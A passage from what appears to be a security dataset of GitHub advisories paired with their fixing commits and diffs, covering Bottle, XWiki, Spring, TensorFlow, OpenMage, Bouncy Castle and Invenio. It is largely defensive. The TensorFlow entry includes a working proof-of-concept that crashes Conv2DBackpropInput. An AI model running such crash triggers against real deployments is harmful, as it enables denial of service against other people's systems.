service in bottle Bottle before 0.12.20 mishandles errors during early request binding.","published_date":"2022-06-03","chain_len":2,"project":"https:\/\/github.com\/bottlepy\/bottle","commit_href":"https:\/\/github.com\/bottlepy\/bottle\/commit\/a2b0ee6bb4ce88895429ec4aca856616244c4c4c","commit_sha":"a2b0ee6bb4ce88895429ec4aca856616244c4c4c","patch":"MULTI","chain_ord":"['e140e1b54da721a660f2eb9d58a106b7b3ff2f00', 'a2b0ee6bb4ce88895429ec4aca856616244c4c4c']","before_first_fix_commit":"{'04b27f185412250f9389a6a14d1e1c516c87e13c'}","last_fix_commit":"a2b0ee6bb4ce88895429ec4aca856616244c4c4c","chain_ord_pos":2.0,"commit_datetime":"05\/26\/2022, 13:36:31","message":"Release of 0.12.20\n\nThis release contains a security fix.\nThanks Elton Nokaj for responsibly reporting this issue.","author":"Marcel Hellkamp","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'bottle.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bottlepy\/bottle\/raw\/a2b0ee6bb4ce88895429ec4aca856616244c4c4c\/bottle.py', 'patch': \"@@ -16,7 +16,7 @@\\n from __future__ import with_statement\\n \\n __author__ = 'Marcel Hellkamp'\\n-__version__ = '0.12.19'\\n+__version__ = '0.12.20'\\n __license__ = 'MIT'\\n \\n # The gevent server adapter needs to patch some modules before they are imported\"}}","message_norm":"release of 0.12.20\n\nthis release contains a security fix.\nthanks elton nokaj for responsibly reporting this issue.","language":"en","entities":"[('0.12.20', 'VERSION', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bottle.py'])","num_files":1.0},{"index":3441,"vuln_id":"GHSA-xhp9-4947-rq78","cwe_id":"{'CWE-755'}","score":9.8,"chain":"{'https:\/\/github.com\/bottlepy\/bottle\/commit\/a2b0ee6bb4ce88895429ec4aca856616244c4c4c', 'https:\/\/github.com\/bottlepy\/bottle\/commit\/e140e1b54da721a660f2eb9d58a106b7b3ff2f00'}","dataset":"osv","summary":"Denial of service in bottle Bottle before 0.12.20 mishandles errors during early request binding.","published_date":"2022-06-03","chain_len":2,"project":"https:\/\/github.com\/bottlepy\/bottle","commit_href":"https:\/\/github.com\/bottlepy\/bottle\/commit\/e140e1b54da721a660f2eb9d58a106b7b3ff2f00","commit_sha":"e140e1b54da721a660f2eb9d58a106b7b3ff2f00","patch":"MULTI","chain_ord":"['e140e1b54da721a660f2eb9d58a106b7b3ff2f00', 'a2b0ee6bb4ce88895429ec4aca856616244c4c4c']","before_first_fix_commit":"{'04b27f185412250f9389a6a14d1e1c516c87e13c'}","last_fix_commit":"a2b0ee6bb4ce88895429ec4aca856616244c4c4c","chain_ord_pos":1.0,"commit_datetime":"05\/26\/2022, 12:49:32","message":"Gracefully handle errors during early request binding.","author":"Marcel Hellkamp","comments":null,"stats":"{'additions': 9, 'deletions': 7, 'total': 16}","files":"{'bottle.py': {'additions': 9, 'deletions': 7, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bottlepy\/bottle\/raw\/e140e1b54da721a660f2eb9d58a106b7b3ff2f00\/bottle.py', 'patch': \"@@ -848,17 +848,19 @@ def default_error_handler(self, res):\\n         return tob(template(ERROR_PAGE_TEMPLATE, e=res))\\n \\n     def _handle(self, environ):\\n-        path = environ['bottle.raw_path'] = environ['PATH_INFO']\\n-        if py3k:\\n-            try:\\n-                environ['PATH_INFO'] = path.encode('latin1').decode('utf8')\\n-            except UnicodeError:\\n-                return HTTPError(400, 'Invalid path string. Expected UTF-8')\\n-\\n         try:\\n+\\n             environ['bottle.app'] = self\\n             request.bind(environ)\\n             response.bind()\\n+\\n+            path = environ['bottle.raw_path'] = environ['PATH_INFO']\\n+            if py3k:\\n+                try:\\n+                    environ['PATH_INFO'] = path.encode('latin1').decode('utf8')\\n+                except UnicodeError:\\n+                    return HTTPError(400, 'Invalid path string. Expected UTF-8')\\n+\\n             try:\\n                 self.trigger_hook('before_request')\\n                 route, args = self.router.match(environ)\"}}","message_norm":"gracefully handle errors during early request binding.","language":"en","entities":"[('errors', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bottle.py'])","num_files":1.0},{"index":3447,"vuln_id":"GHSA-xjfw-5vv5-vjq2","cwe_id":"{'CWE-79', 'CWE-116'}","score":7.4,"chain":"{'https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/21906acb5ee2304552f56f9bbdbf8e7d368f7f3a'}","dataset":"osv","summary":"Cross-site Scripting in Filter Stream Converter Application in XWiki Platform ### Impact\nWe found a possible XSS vector in the `Filter.FilterStreamDescriptorForm` wiki page related to pretty much all the form fields printed in the home page of the application.\n\n### Patches\nThe issue is patched in versions 12.10.11, 14.0-rc-1, 13.4.7, 13.10.3.\n\n### Workarounds\nThe easiest workaround is to edit the wiki page `Filter.FilterStreamDescriptorForm` (with wiki editor) and change the lines\n\n```\n          <input type=\"text\" id=\"$descriptorId\" name=\"$descriptorId\" value=\"#if($request.get($descriptorId))$request.get($descriptorId)#else$descriptor.defaultValue#end\"\/>\n        #else\n          <input type=\"text\" id=\"$descriptorId\" name=\"$descriptorId\"#if($request.get($descriptorId))value=\"$request.get($descriptorId)\"#end\/>\n```\n\ninto\n\n```\n          <input type=\"text\" id=\"$descriptorId\" name=\"$descriptorId\" value=\"#if($request.get($descriptorId))$escapetool.xml($request.get($descriptorId))#else$descriptor.defaultValue#end\"\/>\n        #else\n          <input type=\"text\" id=\"$descriptorId\" name=\"$descriptorId\"#if($request.get($descriptorId))value=\"$escapetool.xml($request.get($descriptorId))\"#end\/>\n```","published_date":"2022-06-01","chain_len":1,"project":"https:\/\/github.com\/xwiki\/xwiki-platform","commit_href":"https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/21906acb5ee2304552f56f9bbdbf8e7d368f7f3a","commit_sha":"21906acb5ee2304552f56f9bbdbf8e7d368f7f3a","patch":"SINGLE","chain_ord":"['21906acb5ee2304552f56f9bbdbf8e7d368f7f3a']","before_first_fix_commit":"{'eed842a0ea9e263548805b908ebbd362213ce0ea'}","last_fix_commit":"21906acb5ee2304552f56f9bbdbf8e7d368f7f3a","chain_ord_pos":1.0,"commit_datetime":"01\/04\/2022, 10:33:53","message":"XWIKI-19293: Fix bad escaping","author":"Thomas Mortagne","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'xwiki-platform-core\/xwiki-platform-filter\/xwiki-platform-filter-ui\/src\/main\/resources\/Filter\/FilterStreamDescriptorForm.xml': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/xwiki\/xwiki-platform\/raw\/21906acb5ee2304552f56f9bbdbf8e7d368f7f3a\/xwiki-platform-core%2Fxwiki-platform-filter%2Fxwiki-platform-filter-ui%2Fsrc%2Fmain%2Fresources%2FFilter%2FFilterStreamDescriptorForm.xml', 'patch': '@@ -58,9 +58,9 @@\\n       &lt;dd&gt;\\n         ## TODO: design a real framework to generate form by type\\n         #if (($descriptor.defaultValue || \"$!descriptor.defaultValue\" != \\'\\') &amp;&amp; ($descriptor.type.getName() == \\'boolean\\' || $descriptor.type.getName() == \\'int\\' || $descriptor.type.getName() == \\'java.lang.String\\'))\\n-          &lt;input type=\"text\" id=\"$descriptorId\" name=\"$descriptorId\" value=\"#if($request.get($descriptorId))$request.get($descriptorId)#else$descriptor.defaultValue#end\"\/&gt;\\n+          &lt;input type=\"text\" id=\"$descriptorId\" name=\"$descriptorId\" value=\"#if($request.get($descriptorId))$escapetool.xml($request.get($descriptorId))#else$descriptor.defaultValue#end\"\/&gt;\\n         #else\\n-          &lt;input type=\"text\" id=\"$descriptorId\" name=\"$descriptorId\"#if($request.get($descriptorId))value=\"$request.get($descriptorId)\"#end\/&gt;\\n+          &lt;input type=\"text\" id=\"$descriptorId\" name=\"$descriptorId\"#if($request.get($descriptorId))value=\"$escapetool.xml($request.get($descriptorId))\"#end\/&gt;\\n         #end\\n       &lt;\/dd&gt;\\n     #end'}}","message_norm":"xwiki-19293: fix bad escaping","language":"ca","entities":"[('fix', 'ACTION', ''), ('escaping', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['xwiki-platform-core\/xwiki-platform-filter\/xwiki-platform-filter-ui\/src\/main\/resources\/Filter\/FilterStreamDescriptorForm.xml'])","num_files":1.0},{"index":3452,"vuln_id":"GHSA-xjrf-8x4f-43h4","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/spring-projects\/spring-framework\/commit\/9982b4c01a8c7be0961e58b58ed83731c40449ff', 'https:\/\/github.com\/spring-projects\/spring-framework\/commit\/7a7df6637478607bef0277bf52a4e0a03e20a248', 'https:\/\/github.com\/spring-projects\/spring-framework\/commit\/f5c9fe69a444607af667911bd4c5074b5b073e7b'}","dataset":"osv","summary":"Improper Neutralization of Input During Web Page Generation in Spring Framework The JavaScriptUtils.javaScriptEscape method in web\/util\/JavaScriptUtils.java in Spring MVC in Spring Framework before 3.2.2 does not properly escape certain characters, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a (1) line separator or (2) paragraph separator Unicode character or (3) left or (4) right angle bracket.","published_date":"2022-05-05","chain_len":3,"project":"https:\/\/github.com\/spring-projects\/spring-framework","commit_href":"https:\/\/github.com\/spring-projects\/spring-framework\/commit\/9982b4c01a8c7be0961e58b58ed83731c40449ff","commit_sha":"9982b4c01a8c7be0961e58b58ed83731c40449ff","patch":"MULTI","chain_ord":"['9982b4c01a8c7be0961e58b58ed83731c40449ff', 'f5c9fe69a444607af667911bd4c5074b5b073e7b', '7a7df6637478607bef0277bf52a4e0a03e20a248']","before_first_fix_commit":"{'63bff1f068f0c749f938abacba1d38b7d0ca3cf9'}","last_fix_commit":"7a7df6637478607bef0277bf52a4e0a03e20a248","chain_ord_pos":1.0,"commit_datetime":"01\/23\/2013, 18:35:14","message":"Add BS and VT char escape sequences to JavaScriptUtils\n\nIssue: SPR-9983","author":"Rossen Stoyanchev","comments":null,"stats":"{'additions': 14, 'deletions': 7, 'total': 21}","files":"{'spring-web\/src\/main\/java\/org\/springframework\/web\/util\/JavaScriptUtils.java': {'additions': 14, 'deletions': 7, 'changes': 21, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/spring-projects\/spring-framework\/raw\/9982b4c01a8c7be0961e58b58ed83731c40449ff\/spring-web%2Fsrc%2Fmain%2Fjava%2Forg%2Fspringframework%2Fweb%2Futil%2FJavaScriptUtils.java', 'patch': '@@ -1,5 +1,5 @@\\n \/*\\n- * Copyright 2002-2008 the original author or authors.\\n+ * Copyright 2002-2013 the original author or authors.\\n  *\\n  * Licensed under the Apache License, Version 2.0 (the \"License\");\\n  * you may not use this file except in compliance with the License.\\n@@ -21,21 +21,21 @@\\n  * Escapes based on the JavaScript 1.5 recommendation.\\n  *\\n  * <p>Reference:\\n- * <a href=\"http:\/\/developer.mozilla.org\/en\/docs\/Core_JavaScript_1.5_Guide:Literals#String_Literals\">\\n- * Core JavaScript 1.5 Guide\\n- * <\/a>\\n+ * <a href=\"https:\/\/developer.mozilla.org\/en-US\/docs\/JavaScript\/Guide\/Values,_variables,_and_literals#String_literals\">\\n+ * JavaScript Guide<\/a> on Mozilla Developer Network.\\n  *\\n  * @author Juergen Hoeller\\n  * @author Rob Harrop\\n+ * @author Rossen Stoyanchev\\n  * @since 1.1.1\\n  *\/\\n public class JavaScriptUtils {\\n \\n \\t\/**\\n-\\t * Turn special characters into escaped characters conforming to JavaScript.\\n-\\t * Handles complete character set defined in HTML 4.01 recommendation.\\n+\\t * Turn JavaScript special characters into escaped characters.\\n+\\t *\\n \\t * @param input the input string\\n-\\t * @return the escaped string\\n+\\t * @return the string with escaped characters\\n \\t *\/\\n \\tpublic static String javaScriptEscape(String input) {\\n \\t\\tif (input == null) {\\n@@ -73,6 +73,13 @@ else if (c == \\'\\\\r\\') {\\n \\t\\t\\telse if (c == \\'\\\\f\\') {\\n \\t\\t\\t\\tfiltered.append(\"\\\\\\\\f\");\\n \\t\\t\\t}\\n+\\t\\t\\telse if (c == \\'\\\\b\\') {\\n+\\t\\t\\t\\tfiltered.append(\"\\\\\\\\b\");\\n+\\t\\t\\t}\\n+\\t\\t\\t\/\/ No \\'\\\\v\\' in Java, use octal value for VT ascii char\\n+\\t\\t\\telse if (c == \\'\\\\013\\') {\\n+\\t\\t\\t\\tfiltered.append(\"\\\\\\\\v\");\\n+\\t\\t\\t}\\n \\t\\t\\telse {\\n \\t\\t\\t\\tfiltered.append(c);\\n \\t\\t\\t}'}}","message_norm":"add bs and vt char escape sequences to javascriptutils\n\nissue: spr-9983","language":"ca","entities":"[('add', 'ACTION', ''), ('escape', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['spring-web\/src\/main\/java\/org\/springframework\/web\/util\/JavaScriptUtils.java'])","num_files":1.0},{"index":3455,"vuln_id":"GHSA-xm2v-8rrw-w9pm","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2be2cdf3a123e231b16f766aa0e27d56b4606535'}","dataset":"osv","summary":"Division by 0 in `Conv2DBackpropInput` ### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropInput`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([52, 1, 1, 5], shape=[4], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 1, 5, 0], dtype=tf.float32)\nout_backprop = tf.constant([], shape=[52, 1, 1, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropInput(input_sizes=input_tensor, filter=filter_tensor,\n                               out_backprop=out_backprop, strides=[1, 1, 1, 1],\n                               use_cudnn_on_gpu=True, padding='SAME',\n                               explicit_paddings=[], data_format='NHWC',\n                               dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/b40060c9f697b044e3107917c797ba052f4506ab\/tensorflow\/core\/kernels\/conv_grad_input_ops.h#L625-L655) does a division by a quantity that is controlled by the caller:\n\n```cc \n  const size_t size_A = output_image_size * dims.out_depth; \n  const size_t size_B = filter_total_size * dims.out_depth;\n  const size_t size_C = output_image_size * filter_total_size;\n  const size_t work_unit_size = size_A + size_B + size_C;\n  ...\n  const size_t shard_size =\n      use_parallel_contraction ? 1 :\n      (target_working_set_size + work_unit_size - 1) \/ work_unit_size;\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2be2cdf3a123e231b16f766aa0e27d56b4606535](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2be2cdf3a123e231b16f766aa0e27d56b4606535).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2be2cdf3a123e231b16f766aa0e27d56b4606535","commit_sha":"2be2cdf3a123e231b16f766aa0e27d56b4606535","patch":"SINGLE","chain_ord":"['2be2cdf3a123e231b16f766aa0e27d56b4606535']","before_first_fix_commit":"{'b40060c9f697b044e3107917c797ba052f4506ab'}","last_fix_commit":"2be2cdf3a123e231b16f766aa0e27d56b4606535","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2021, 01:13:04","message":"Prevent yet another division by zero\n\nPiperOrigin-RevId: 369343977\nChange-Id: I1a60da4cf512e60fd91e069c16e026544632fe7f","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/conv_grad_input_ops.h': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/2be2cdf3a123e231b16f766aa0e27d56b4606535\/tensorflow%2Fcore%2Fkernels%2Fconv_grad_input_ops.h', 'patch': '@@ -649,6 +649,11 @@ class Conv2DCustomBackpropInputOp : public OpKernel {\\n         dims.batch_size == 1 ||\\n         thread_work_unit_size >= min_thread_work_unit_size;\\n \\n+    OP_REQUIRES(\\n+        context, work_unit_size > 0,\\n+        errors::InvalidArgument(\"input, filter_sizes and out_backprop tensors \"\\n+                                \"must all have at least 1 element\"));\\n+\\n     const size_t shard_size =\\n         use_parallel_contraction\\n             ? 1'}}","message_norm":"prevent yet another division by zero\n\npiperorigin-revid: 369343977\nchange-id: i1a60da4cf512e60fd91e069c16e026544632fe7f","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by zero', 'SECWORD', ''), ('369343977', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_grad_input_ops.h'])","num_files":1.0},{"index":3457,"vuln_id":"GHSA-xm9f-vxmx-4m58","cwe_id":"{'CWE-20'}","score":0.0,"chain":"{'https:\/\/github.com\/OpenMage\/magento-lts\/commit\/34709ac642d554aa1824892059186dd329db744b'}","dataset":"osv","summary":"Data Flow Sanitation Issue Fix  ### Impact\nDue to missing sanitation in data flow it was possible for admin users to upload arbitrary executable files to the server.","published_date":"2021-08-30","chain_len":1,"project":"https:\/\/github.com\/OpenMage\/magento-lts","commit_href":"https:\/\/github.com\/OpenMage\/magento-lts\/commit\/34709ac642d554aa1824892059186dd329db744b","commit_sha":"34709ac642d554aa1824892059186dd329db744b","patch":"SINGLE","chain_ord":"['34709ac642d554aa1824892059186dd329db744b']","before_first_fix_commit":"{'b99307d00b59c4a226a1e3e4083f02cf2fc8fce7'}","last_fix_commit":"34709ac642d554aa1824892059186dd329db744b","chain_ord_pos":1.0,"commit_datetime":"08\/26\/2021, 01:13:20","message":"Merge pull request from GHSA-xm9f-vxmx-4m58\n\nCo-authored-by: Mark Lewis <markwlewis@Marks-MacBook-Pro.local>","author":"Mark Lewis","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/code\/core\/Mage\/Dataflow\/Model\/Convert\/Adapter\/Io.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/OpenMage\/magento-lts\/raw\/34709ac642d554aa1824892059186dd329db744b\/app%2Fcode%2Fcore%2FMage%2FDataflow%2FModel%2FConvert%2FAdapter%2FIo.php', 'patch': \"@@ -49,7 +49,7 @@ public function getResource($forWrite = false)\\n             $isError = false;\\n \\n             $ioConfig = $this->getVars();\\n-            switch ($this->getVar('type', 'file')) {\\n+            switch (strtolower($this->getVar('type', 'file'))) {\\n                 case 'file':\\n                     \/\/validate export\/import path\\n                     $path = rtrim($ioConfig['path'], '\\\\\\\\\/')\"}}","message_norm":"merge pull request from ghsa-xm9f-vxmx-4m58\n\nco-authored-by: mark lewis <markwlewis@marks-macbook-pro.local>","language":"en","entities":"[('ghsa-xm9f-vxmx-4m58', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/code\/core\/Mage\/Dataflow\/Model\/Convert\/Adapter\/Io.php'])","num_files":1.0},{"index":3479,"vuln_id":"GHSA-xqj7-j8j5-f2xr","cwe_id":"{'CWE-327'}","score":7.5,"chain":"{'https:\/\/github.com\/bcgit\/bc-java\/commit\/73780ac522b7795fc165630aba8d5f5729acc839', 'https:\/\/github.com\/bcgit\/bc-java\/commit\/22467b6e8fe19717ecdf201c0cf91bacf04a55ad'}","dataset":"osv","summary":"Bouncy Castle has a flaw in the Low-level interface to RSA key pair generator Bouncy Castle BC 1.54 - 1.59, BC-FJA 1.0.0, BC-FJA 1.0.1 and earlier have a flaw in the Low-level interface to RSA key pair generator, specifically RSA Key Pairs generated in low-level API with added certainty may have less M-R tests than expected. This appears to be fixed in versions BC 1.60 beta 4 and later, BC-FJA 1.0.2 and later.","published_date":"2018-10-16","chain_len":2,"project":"https:\/\/github.com\/bcgit\/bc-java","commit_href":"https:\/\/github.com\/bcgit\/bc-java\/commit\/73780ac522b7795fc165630aba8d5f5729acc839","commit_sha":"73780ac522b7795fc165630aba8d5f5729acc839","patch":"MULTI","chain_ord":"['73780ac522b7795fc165630aba8d5f5729acc839', '22467b6e8fe19717ecdf201c0cf91bacf04a55ad']","before_first_fix_commit":"{'73780ac522b7795fc165630aba8d5f5729acc839'}","last_fix_commit":"22467b6e8fe19717ecdf201c0cf91bacf04a55ad","chain_ord_pos":1.0,"commit_datetime":"04\/19\/2018, 08:40:01","message":"BJA-694 cleaned up primality test","author":"David Hook","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bcgit\/bc-java\/raw\/73780ac522b7795fc165630aba8d5f5729acc839\/core%2Fsrc%2Fmain%2Fjava%2Forg%2Fbouncycastle%2Fcrypto%2Fgenerators%2FRSAKeyPairGenerator.java', 'patch': '@@ -20,12 +20,10 @@\\n     private static final BigInteger ONE = BigInteger.valueOf(1);\\n \\n     private RSAKeyGenerationParameters param;\\n-    private int iterations;\\n \\n     public void init(KeyGenerationParameters param)\\n     {\\n         this.param = (RSAKeyGenerationParameters)param;\\n-        this.iterations = getNumberOfIterations(this.param.getStrength(), this.param.getCertainty());\\n     }\\n \\n     public AsymmetricCipherKeyPair generateKeyPair()\\n@@ -159,6 +157,8 @@ public AsymmetricCipherKeyPair generateKeyPair()\\n      *\/\\n     protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger sqrdBound)\\n     {\\n+        int iterations = getNumberOfIterations(bitlength, param.getCertainty());\\n+\\n         for (int i = 0; i != 5 * bitlength; i++)\\n         {\\n             BigInteger p = new BigInteger(bitlength, 1, param.getRandom());\\n@@ -173,7 +173,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\\n                 continue;\\n             }\\n \\n-            if (!isProbablePrime(p))\\n+            if (!isProbablePrime(p, iterations))\\n             {\\n                 continue;\\n             }\\n@@ -189,7 +189,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\\n         throw new IllegalStateException(\"unable to generate prime number for RSA key\");\\n     }\\n \\n-    protected boolean isProbablePrime(BigInteger x)\\n+    protected boolean isProbablePrime(BigInteger x, int iterations)\\n     {\\n         \/*\\n          * Primes class for FIPS 186-4 C.3 primality checking'}}","message_norm":"bja-694 cleaned up primality test","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java'])","num_files":1.0},{"index":3480,"vuln_id":"GHSA-xqj7-j8j5-f2xr","cwe_id":"{'CWE-327'}","score":7.5,"chain":"{'https:\/\/github.com\/bcgit\/bc-java\/commit\/73780ac522b7795fc165630aba8d5f5729acc839', 'https:\/\/github.com\/bcgit\/bc-java\/commit\/22467b6e8fe19717ecdf201c0cf91bacf04a55ad'}","dataset":"osv","summary":"Bouncy Castle has a flaw in the Low-level interface to RSA key pair generator Bouncy Castle BC 1.54 - 1.59, BC-FJA 1.0.0, BC-FJA 1.0.1 and earlier have a flaw in the Low-level interface to RSA key pair generator, specifically RSA Key Pairs generated in low-level API with added certainty may have less M-R tests than expected. This appears to be fixed in versions BC 1.60 beta 4 and later, BC-FJA 1.0.2 and later.","published_date":"2018-10-16","chain_len":2,"project":"https:\/\/github.com\/bcgit\/bc-java","commit_href":"https:\/\/github.com\/bcgit\/bc-java\/commit\/22467b6e8fe19717ecdf201c0cf91bacf04a55ad","commit_sha":"22467b6e8fe19717ecdf201c0cf91bacf04a55ad","patch":"MULTI","chain_ord":"['73780ac522b7795fc165630aba8d5f5729acc839', '22467b6e8fe19717ecdf201c0cf91bacf04a55ad']","before_first_fix_commit":"{'73780ac522b7795fc165630aba8d5f5729acc839'}","last_fix_commit":"22467b6e8fe19717ecdf201c0cf91bacf04a55ad","chain_ord_pos":2.0,"commit_datetime":"04\/22\/2018, 22:14:24","message":"BJA-694 minor tweak to avoid method signature change","author":"David Hook","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bcgit\/bc-java\/raw\/22467b6e8fe19717ecdf201c0cf91bacf04a55ad\/core%2Fsrc%2Fmain%2Fjava%2Forg%2Fbouncycastle%2Fcrypto%2Fgenerators%2FRSAKeyPairGenerator.java', 'patch': '@@ -157,8 +157,6 @@ public AsymmetricCipherKeyPair generateKeyPair()\\n      *\/\\n     protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger sqrdBound)\\n     {\\n-        int iterations = getNumberOfIterations(bitlength, param.getCertainty());\\n-\\n         for (int i = 0; i != 5 * bitlength; i++)\\n         {\\n             BigInteger p = new BigInteger(bitlength, 1, param.getRandom());\\n@@ -173,7 +171,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\\n                 continue;\\n             }\\n \\n-            if (!isProbablePrime(p, iterations))\\n+            if (!isProbablePrime(p))\\n             {\\n                 continue;\\n             }\\n@@ -189,8 +187,10 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\\n         throw new IllegalStateException(\"unable to generate prime number for RSA key\");\\n     }\\n \\n-    protected boolean isProbablePrime(BigInteger x, int iterations)\\n+    protected boolean isProbablePrime(BigInteger x)\\n     {\\n+        int iterations = getNumberOfIterations(x.bitLength(), param.getCertainty());\\n+\\n         \/*\\n          * Primes class for FIPS 186-4 C.3 primality checking\\n          *\/'}}","message_norm":"bja-694 minor tweak to avoid method signature change","language":"en","entities":"[('tweak', 'FLAW', ''), ('signature', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java'])","num_files":1.0},{"index":3484,"vuln_id":"GHSA-xr38-w74q-r8jv","cwe_id":"{'CWE-862', 'CWE-863'}","score":6.4,"chain":"{'https:\/\/github.com\/inveniosoftware\/invenio-drafts-resources\/commit\/039b0cff1ad4b952000f4d8c3a93f347108b6626'}","dataset":"osv","summary":"Permissions not properly checked in Invenio-Drafts-Resources ### Impact\n\nInvenio-Drafts-Resources does not properly check permissions when a record is published. The vulnerability is exploitable in a default installation of InvenioRDM. An authenticated user is able via REST API calls to publish draft records of other users if they know the record identifier and the draft validates (e.g. all require fields filled out). An attacker is not able to modify the data in the record, and thus e.g. *cannot* change a record from restricted to public.\n\n### Details\n\nThe service's ``publish()`` method contains the following permission check:\n\n```python\ndef publish(..):\n    self.require_permission(identity, \"publish\")\n```\nHowever, the record should have been passed into the permission check so that the need generators have access to e.g. the record owner.\n\n```python\ndef publish(..):\n    self.require_permission(identity, \"publish\", record=record)\n```\nThe bug is activated in Invenio-RDM-Records which has a need generator called ``RecordOwners()``, which when no record is passed in defaults to allow any authenticated user:\n\n```python\nclass RecordOwners(Generator):\n    def needs(self, record=None, **kwargs):\n        if record is None:\n            return [authenticated_user]\n    # ...\n```\n\n### Patches\n\nThe problem is patched in Invenio-Drafts-Resources v0.13.7 and 0.14.6+, which is part of InvenioRDM v6.0.1 and InvenioRDM v7.0 respectively.\n\nYou can verify the version installed of Invenio-Drafts-Resources via PIP:\n\n```console\ncd ~\/src\/my-site\npipenv run pip freeze | grep invenio-drafts-resources\n```\n\n### References\n\n- [Security policy](https:\/\/invenio.readthedocs.io\/en\/latest\/community\/security-policy.html)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Chat with us on Discord: https:\/\/discord.gg\/8qatqBC","published_date":"2021-12-06","chain_len":1,"project":"https:\/\/github.com\/inveniosoftware\/invenio-drafts-resources","commit_href":"https:\/\/github.com\/inveniosoftware\/invenio-drafts-resources\/commit\/039b0cff1ad4b952000f4d8c3a93f347108b6626","commit_sha":"039b0cff1ad4b952000f4d8c3a93f347108b6626","patch":"SINGLE","chain_ord":"['039b0cff1ad4b952000f4d8c3a93f347108b6626']","before_first_fix_commit":"{'998ede99c377c84f11fe22c07c20f90c88c463dc'}","last_fix_commit":"039b0cff1ad4b952000f4d8c3a93f347108b6626","chain_ord_pos":1.0,"commit_datetime":"11\/24\/2021, 14:32:41","message":"security: fix missing permission check of publish\n\n* Invenio-Drafts-Resources does not properly check permissions when a\n  record is published. The vulnerability is exploitable in a default\n  installation of InvenioRDM. An authenticated a user is able via REST\n  API calls to publish draft records of other users if they know the\n  record identifier and the draft validates (e.g. all require fields\n  filled out). An attacker is not able to modify the data in the record,\n  and thus e.g. cannot change a record from restricted to public.","author":"Lars Holm Nielsen","comments":null,"stats":"{'additions': 1, 'deletions': 2, 'total': 3}","files":"{'invenio_drafts_resources\/services\/records\/service.py': {'additions': 1, 'deletions': 2, 'changes': 3, 'status': 'modified', 'raw_url': 